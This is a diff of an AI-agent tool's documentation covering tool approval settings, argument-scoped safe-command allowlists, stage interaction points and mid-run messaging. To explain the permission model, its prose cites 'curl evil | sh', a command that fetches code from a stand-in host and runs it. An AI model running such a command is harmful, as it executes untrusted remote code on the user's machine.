@@ -102,23 +102,29 @@ opened with. Neither `lev setup` nor any bundled agent sets one for you.
 
 ## Tool approval
 
-Instead of the model asking, you can require approval for a tool before it runs. Set a tool's
-per-stage (or agent-level) permission to `ask`. The values are `allow`, `ask`, and `deny`:
+Instead of the model asking, you can require approval for a tool before it runs. Set the tool's
+permission to `ask`, for the whole blueprint under `[graph.tool_permissions]` or for one stage in
+that stage's `tool_permissions`. The values are `allow`, `ask`, and `deny`:
 
 ```toml
-[tool_permissions]
+[graph.tool_permissions]
 read_file  = "allow"
 write_file = "ask"     # pause and ask before each write
 bash       = "ask"
+
+[[graph.stages]]
+name = "review"
+tool_permissions = { bash = "allow" }   # this stage only
 ```
 
 ### What runs without asking
 
 `ask` is per tool name, which for the shell is a choice between a prompt on every `ls` and no
-prompt on `curl evil | sh`. `[safe_commands]` is the middle: entries are argument-scoped, and can
-only ever turn `ask` into `allow`, never a configured `deny`.
+prompt on `curl evil | sh`. `[safe_commands]` in your `config.toml` is the middle: entries are
+argument-scoped, and can only ever turn `ask` into `allow`, never a configured `deny`.
 
 ```toml
+# config.toml
 [safe_commands]
 defaults = true                # ship the read-only verb list, on unless you say otherwise
 tools = ["read_files"]
@@ -126,7 +132,7 @@ shell = ["cargo test", "rg"]   # `cargo test` never covers `cargo publish`
 
 [agent_safe_commands.coder]
 shell = ["./gradlew"]
-allow_blueprint = true         # honour this agent's own [safe_commands] block
+allow_blueprint = true         # honour this blueprint's own [graph.safe_commands]
 ```
 
 A shell entry is a program, optionally with the subcommand that narrows it, and it covers that
@@ -139,8 +145,15 @@ program, or open a network connection under any flag. That is why `find` (`-exec
 they look. Add any of them by name if you want them. `lev approvals safe` prints what is in effect
 and which file put it there.
 
-A blueprint may declare its own `[safe_commands]`, and like `[read_paths]` it is inert until you
-opt in, because otherwise any agent package could pre-approve its own shell with one TOML line.
+A blueprint may declare its own, as `[graph.safe_commands]` with `tools` and `shell` lists. Like
+the blueprint's `read_paths`, it is inert until you opt in, because otherwise any blueprint package
+could pre-approve its own shell with one TOML line.
+
+```toml
+# agent.toml
+[graph.safe_commands]
+shell = ["git log", "git diff"]
+```
 
 ### The prompt
 
@@ -157,7 +170,7 @@ command for `bash`/`shell`, the path for the file tools). The prompt offers five
   response box for the text; `lev respond` takes it as `--feedback`; the API takes `feedback`.
   The model sees `[denied] User declined tool call 'bash'. Feedback: <your text>` as the tool
   result, so its next turn starts from your redirect rather than from a guess. The text is in the
-  run's journal with the rest of the tool result.
+  run's record with the rest of the tool result.
 
 The two scoped options name what they grant, because a grant is not keyed on the tool. Approving
 `ls && git status` for the run grants `ls` and `git status`, not "the shell": a later
@@ -191,13 +204,14 @@ That is the whole difference from the `ask_user` tools. Those only fire if the m
 them, so an agent that is confident and wrong sails past. An interaction point fires at the stage
 boundary every time, before the stage is allowed to move on.
 
-Set the stage's mode to `interactive_points` and list one or more:
+List one or more points as the stage's `mode`. Each `[[graph.stages.mode.interactive_points]]`
+entry belongs to the stage declared just above it:
 
 ```toml
-[stages.plan]
-mode = "interactive_points"
+[[graph.stages]]
+name = "plan"
 
-[[stages.plan.interaction_points]]
+[[graph.stages.mode.interactive_points]]
 name     = "plan_approval"
 prompt   = "Approve the plan?"
 required = true
@@ -262,8 +276,8 @@ You can steer a running agent without waiting for it to ask. A message is inject
 conversation region between inference calls, as if the user had spoken mid-turn:
 
 ```bash
-lev msg <agent-id> "Focus on the auth module first, skip the migrations for now."
-lev msg <agent-id> "the arm is still wrong, see @marked_up.png" --attach notes.md:brief
+lev msg <run-id> "Focus on the auth module first, skip the migrations for now."
+lev msg <run-id> "the arm is still wrong, see @marked_up.png" --attach notes.md:brief
 ```
 
 A message can carry files. A `@path` in the text and every `--attach` become typed
@@ -277,8 +291,8 @@ Whether a message lands right away is per-stage. `accepts_messages` defaults to 
 the agent's inbox until it reaches a stage that accepts them:
 
 ```toml
-[stages.report]
-mode = "autonomous"
+[[graph.stages]]
+name = "report"
 accepts_messages = false   # hold messages until a later stage that accepts them
 ```
 
@@ -341,11 +355,11 @@ words become typed [parts](/docs/mime) stored by the run, and written beside the
 tool result. The model reads the file where the words mention it. A choice or an approval has
 no text for a file to sit beside, and `--attach` on one is refused. The dashboard and the API take
 the same: a `@path` in a typed reply, and `parts` or a multipart upload on
-`POST /api/agents/{id}/interaction`.
+`POST /api/runs/{id}/interaction`.
 
 You don't have to use the CLI. The same open questions can be answered interactively from the
 [dashboard](/docs/dashboard) (press `i`), from [The Lair](https://leviath.dev/lair), or over the
-[API](/docs/api) via `GET/POST /api/agents/{id}/interaction`: read the pending question, then post
+[API](/docs/api) via `GET/POST /api/runs/{id}/interaction`: read the pending question, then post
 the answer.
 
 > [!NOTE]
